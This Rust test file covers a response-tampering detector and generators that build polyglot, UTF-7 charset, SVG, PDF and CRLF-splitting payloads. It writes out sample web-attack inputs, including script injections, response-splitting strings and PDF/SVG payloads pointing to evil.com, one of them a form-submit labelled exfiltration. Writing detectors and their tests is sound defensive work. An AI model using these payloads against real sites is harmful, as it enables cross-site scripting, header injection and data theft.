use super::*;

// =========================================================================
// TamperingPattern enum
// =========================================================================

#[test]
fn tampering_pattern_all_returns_eight_variants() {
    let all = TamperingPattern::all();
    assert_eq!(all.len(), 8);
}

#[test]
fn tampering_pattern_display_is_human_readable() {
    assert_eq!(
        TamperingPattern::UnencodedReflection.to_string(),
        "Unencoded Reflection"
    );
    assert_eq!(
        TamperingPattern::CompressedResponseManipulation.to_string(),
        "Compressed Response Manipulation"
    );
}

// =========================================================================
// 1. Unencoded reflection
// =========================================================================

#[test]
fn detect_unencoded_reflection_in_html_body() {
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "text/html")
        .with_body(b"<html><body>Hello <script>alert(1)</script></body></html>")
        .with_reflected_input("<script>alert(1)</script>");
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::UnencodedReflection));
    let f = findings
        .iter()
        .find(|f| f.pattern == TamperingPattern::UnencodedReflection)
        .unwrap();
    assert_eq!(f.severity, Severity::High);
}

#[test]
fn no_reflection_when_input_absent() {
    let ctx = ResponseContext::new(200).with_body(b"<html>safe</html>");
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .all(|f| f.pattern != TamperingPattern::UnencodedReflection));
}

#[test]
fn reflection_in_non_html_context_is_medium_severity() {
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "application/json")
        .with_body(b"{\"msg\": \"evil_payload\"}")
        .with_reflected_input("evil_payload");
    let findings = ResponseTamperingDetector::analyse(&ctx);
    let f = findings
        .iter()
        .find(|f| f.pattern == TamperingPattern::UnencodedReflection)
        .unwrap();
    assert_eq!(f.severity, Severity::Medium);
}

// =========================================================================
// 2. MIME type confusion
// =========================================================================

#[test]
fn detect_html_served_as_plain_text() {
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "text/plain")
        .with_body(b"<html><script>alert(1)</script></html>");
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::MimeTypeConfusion));
}

#[test]
fn detect_js_served_as_image() {
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "image/png")
        .with_body(b"function malicious() { eval('pwned') }");
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::MimeTypeConfusion));
}

#[test]
fn no_mime_confusion_when_types_match() {
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "text/html")
        .with_body(b"<html>legit</html>");
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .all(|f| f.pattern != TamperingPattern::MimeTypeConfusion));
}

// =========================================================================
// 3. Content-sniffing polyglots
// =========================================================================

#[test]
fn detect_gif_html_polyglot() {
    let mut body = b"GIF89a".to_vec();
    body.extend_from_slice(b"\x00\x00\x00\x00\x00\x00\x00<html><script>alert(1)</script>");
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "image/gif")
        .with_body(&body);
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::ContentSniffingPolyglot));
}

#[test]
fn detect_png_js_polyglot() {
    let mut body = vec![0x89, b'P', b'N', b'G'];
    body.extend_from_slice(b"\x00\x00\x00\x00\x00\x00alert(1)");
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "image/png")
        .with_body(&body);
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::ContentSniffingPolyglot));
}

#[test]
fn detect_xml_html_polyglot() {
    let body = b"<?xml version=\"1.0\"?><html><script>alert(1)</script></html>";
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "application/xml")
        .with_body(body);
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::ContentSniffingPolyglot));
}

#[test]
fn nosniff_header_suppresses_polyglot_detection() {
    let mut body = b"GIF89a".to_vec();
    body.extend_from_slice(b"<html><script>x</script>");
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "image/gif")
        .with_header("x-content-type-options", "nosniff")
        .with_body(&body);
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .all(|f| f.pattern != TamperingPattern::ContentSniffingPolyglot));
}

// =========================================================================
// 4. CRLF response splitting
// =========================================================================

#[test]
fn detect_crlf_in_header_value() {
    let ctx = ResponseContext::new(200)
        .with_header("location", "http://example.com\r\nX-Injected: true")
        .with_body(b"ok");
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::CrlfResponseSplitting));
    let f = findings
        .iter()
        .find(|f| f.pattern == TamperingPattern::CrlfResponseSplitting)
        .unwrap();
    assert_eq!(f.severity, Severity::Critical);
}

#[test]
fn detect_url_encoded_crlf_in_header() {
    let ctx = ResponseContext::new(200)
        .with_header("x-redirect", "value%0d%0aInjected: yes")
        .with_body(b"ok");
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::CrlfResponseSplitting));
}

#[test]
fn detect_full_response_in_body() {
    let body = b"some prefix\r\n\r\nHTTP/1.1 200 OK\r\n\r\n<html>injected</html>";
    let ctx = ResponseContext::new(200).with_body(body);
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::CrlfResponseSplitting));
}

// =========================================================================
// 5. Charset confusion
// =========================================================================

#[test]
fn detect_utf7_encoded_content() {
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "text/html")
        .with_body(b"+ADw-script+AD4-alert(1)+ADw-/script+AD4-");
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::CharsetConfusion));
}

#[test]
fn detect_shift_jis_escape_sequence() {
    let mut body = Vec::new();
    body.extend_from_slice(b"\x1b$B");
    body.extend_from_slice(b"payload");
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "text/html")
        .with_body(&body);
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::CharsetConfusion));
}

#[test]
fn detect_charset_mismatch_header_vs_meta() {
    let body = b"<html><head><meta charset=\"utf-7\"></head><body>test</body></html>";
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "text/html; charset=utf-8")
        .with_body(body);
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::CharsetConfusion
            && f.description.contains("mismatch")));
}

// =========================================================================
// 6. SVG injection
// =========================================================================

#[test]
fn detect_svg_with_script_tag() {
    let svg = SvgPayloadGenerator::script_tag("alert(1)");
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "image/svg+xml")
        .with_body(svg.as_bytes());
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings.iter().any(
        |f| f.pattern == TamperingPattern::SvgInjection && f.description.contains("JavaScript")
    ));
}

#[test]
fn detect_svg_with_foreign_object() {
    let svg = SvgPayloadGenerator::foreign_object("<iframe src='http://evil.com'></iframe>");
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "image/svg+xml")
        .with_body(svg.as_bytes());
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::SvgInjection
            && f.description.contains("foreignObject")));
}

#[test]
fn detect_svg_with_external_use() {
    let svg = SvgPayloadGenerator::external_use("http://evil.com/payload.svg");
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "image/svg+xml")
        .with_body(svg.as_bytes());
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(
        findings
            .iter()
            .any(|f| f.pattern == TamperingPattern::SvgInjection
                && f.description.contains("external"))
    );
}

// =========================================================================
// 7. PDF injection
// =========================================================================

#[test]
fn detect_pdf_with_javascript() {
    let pdf = PdfPayloadGenerator::js_on_open("app.alert('pwned')");
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "application/pdf")
        .with_body(&pdf);
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings.iter().any(
        |f| f.pattern == TamperingPattern::PdfInjection && f.description.contains("JavaScript")
    ));
}

#[test]
fn detect_pdf_with_open_action() {
    let pdf = PdfPayloadGenerator::js_on_open("app.alert('test')");
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "application/pdf")
        .with_body(&pdf);
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::PdfInjection
            && f.description.contains("auto-execute")));
}

#[test]
fn detect_pdf_with_submit_form() {
    let pdf = PdfPayloadGenerator::submit_form("http://evil.com/collect");
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "application/pdf")
        .with_body(&pdf);
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::PdfInjection
            && f.description.contains("exfiltration")));
}

#[test]
fn detect_pdf_with_uri_action() {
    let pdf = PdfPayloadGenerator::uri_redirect("http://evil.com");
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "application/pdf")
        .with_body(&pdf);
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::PdfInjection));
}

// =========================================================================
// 8. Compressed response manipulation
// =========================================================================

#[test]
fn detect_gzip_header_non_gzip_body() {
    let ctx = ResponseContext::new(200)
        .with_header("content-encoding", "gzip")
        .with_body(b"this is plaintext, not gzip");
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::CompressedResponseManipulation));
}

#[test]
fn detect_deflate_header_gzip_body() {
    let mut body = vec![0x1f, 0x8b];
    body.extend_from_slice(b"\x08\x00\x00\x00\x00\x00\x00\x03");
    let ctx = ResponseContext::new(200)
        .with_header("content-encoding", "deflate")
        .with_body(&body);
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::CompressedResponseManipulation));
}

#[test]
fn detect_undeclared_compressed_body() {
    let body = vec![0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00];
    let ctx = ResponseContext::new(200).with_body(&body);
    let findings = ResponseTamperingDetector::analyse(&ctx);
    assert!(findings
        .iter()
        .any(|f| f.pattern == TamperingPattern::CompressedResponseManipulation));
}

// =========================================================================
// Polyglot generator
// =========================================================================

#[test]
fn polyglot_html_gif_starts_with_gif_magic() {
    let p = PolyglotGenerator::html_gif("alert(1)");
    assert!(p.starts_with(b"GIF89a"));
    assert!(p.windows(6).any(|w| w == b"<scrip" || w == b"<html>"));
}

#[test]
fn polyglot_js_png_starts_with_png_magic() {
    let p = PolyglotGenerator::js_png("alert(1)");
    assert_eq!(&p[..4], &[0x89, b'P', b'N', b'G']);
    assert!(String::from_utf8_lossy(&p).contains("alert(1)"));
}

#[test]
fn polyglot_xml_html_is_valid_xml_and_html() {
    let p = PolyglotGenerator::xml_html("alert(1)");
    let s = String::from_utf8(p).unwrap();
    assert!(s.starts_with("<?xml"));
    assert!(s.contains("<html"));
    assert!(s.contains("<script>"));
}

#[test]
fn polyglot_all_returns_three_types() {
    let all = PolyglotGenerator::all("alert(1)");
    assert!(all.len() >= 3);
    let names: Vec<&str> = all.iter().map(|(n, _)| *n).collect();
    assert!(names.contains(&"HTML+GIF"));
    assert!(names.contains(&"JS+PNG"));
    assert!(names.contains(&"XML+HTML"));
}

// =========================================================================
// Charset attack generator
// =========================================================================

#[test]
fn charset_utf7_payloads_contain_markers() {
    let p = CharsetAttackGenerator::utf7_script_tag();
    assert!(p.contains("+ADw-"));
    let p2 = CharsetAttackGenerator::utf7_img_onerror();
    assert!(p2.contains("+ADw-"));
}

#[test]
fn charset_all_returns_at_least_three() {
    let all = CharsetAttackGenerator::all();
    assert!(all.len() >= 3);
}

#[test]
fn charset_shift_jis_starts_with_lead_byte() {
    let p = CharsetAttackGenerator::shift_jis_quote_eater();
    assert_eq!(p[0], 0x82);
}

#[test]
fn charset_iso2022jp_contains_escape() {
    let p = CharsetAttackGenerator::iso2022jp_escape();
    assert!(p.starts_with(b"\x1b$B"));
}

#[test]
fn charset_bom_mismatch_starts_with_utf8_bom() {
    let p = CharsetAttackGenerator::bom_charset_mismatch();
    assert_eq!(&p[..3], &[0xEF, 0xBB, 0xBF]);
    assert!(String::from_utf8_lossy(&p).contains("iso-8859-1"));
}

// =========================================================================
// SVG payload generator
// =========================================================================

#[test]
fn svg_script_tag_is_valid_svg() {
    let s = SvgPayloadGenerator::script_tag("alert(1)");
    assert!(s.contains("<svg"));
    assert!(s.contains("<script"));
    assert!(s.contains("</svg>"));
}

#[test]
fn svg_onload_handler_has_event() {
    let s = SvgPayloadGenerator::onload_handler("alert(1)");
    assert!(s.contains("onload="));
}

#[test]
fn svg_animate_xss_has_animation() {
    let s = SvgPayloadGenerator::animate_xss("alert(1)");
    assert!(s.contains("<animate"));
    assert!(s.contains("javascript:"));
}

// =========================================================================
// PDF payload generator
// =========================================================================

#[test]
fn pdf_js_on_open_starts_with_pdf_magic() {
    let p = PdfPayloadGenerator::js_on_open("app.alert('test')");
    assert!(p.starts_with(b"%PDF-"));
    let s = String::from_utf8_lossy(&p);
    assert!(s.contains("/JavaScript"));
    assert!(s.contains("/OpenAction"));
}

#[test]
fn pdf_submit_form_contains_action() {
    let p = PdfPayloadGenerator::submit_form("http://evil.com");
    let s = String::from_utf8_lossy(&p);
    assert!(s.contains("/SubmitForm"));
}

#[test]
fn pdf_uri_redirect_contains_uri() {
    let p = PdfPayloadGenerator::uri_redirect("http://evil.com");
    let s = String::from_utf8_lossy(&p);
    assert!(s.contains("/URI"));
    assert!(s.contains("evil.com"));
}

// =========================================================================
// CRLF payload generator
// =========================================================================

#[test]
fn crlf_header_injection_contains_crlf() {
    let p = CrlfPayloadGenerator::header_injection_cookie("evil_session");
    assert!(p.contains("\r\n"));
    assert!(p.contains("Set-Cookie"));
}

#[test]
fn crlf_full_response_split_has_status_line() {
    let p = CrlfPayloadGenerator::full_response_split("<html>pwned</html>");
    assert!(p.contains("HTTP/1.1 200 OK"));
    assert!(p.contains("<html>pwned</html>"));
}

#[test]
fn crlf_url_encoded_variant() {
    let p = CrlfPayloadGenerator::url_encoded_split();
    assert!(p.contains("%0d%0a"));
}

// =========================================================================
// Severity ordering
// =========================================================================

#[test]
fn severity_ordering_is_correct() {
    assert!(Severity::Low < Severity::Medium);
    assert!(Severity::Medium < Severity::High);
    assert!(Severity::High < Severity::Critical);
}

// =========================================================================
// Integration: full scan finds multiple patterns
// =========================================================================

#[test]
fn full_scan_detects_multiple_patterns_simultaneously() {
    // Build a response that triggers reflection + MIME confusion + charset confusion
    let body = b"+ADw-script+AD4-alert(1)+ADw-/script+AD4-";
    let ctx = ResponseContext::new(200)
        .with_header("content-type", "text/plain")
        .with_body(body)
        .with_reflected_input("+ADw-script+AD4-alert(1)+ADw-/script+AD4-");
    let findings = ResponseTamperingDetector::analyse(&ctx);
    let patterns: std::collections::HashSet<TamperingPattern> =
        findings.iter().map(|f| f.pattern).collect();
    // Should detect at least reflection and charset confusion
    assert!(patterns.contains(&TamperingPattern::UnencodedReflection));
    assert!(patterns.contains(&TamperingPattern::CharsetConfusion));
}
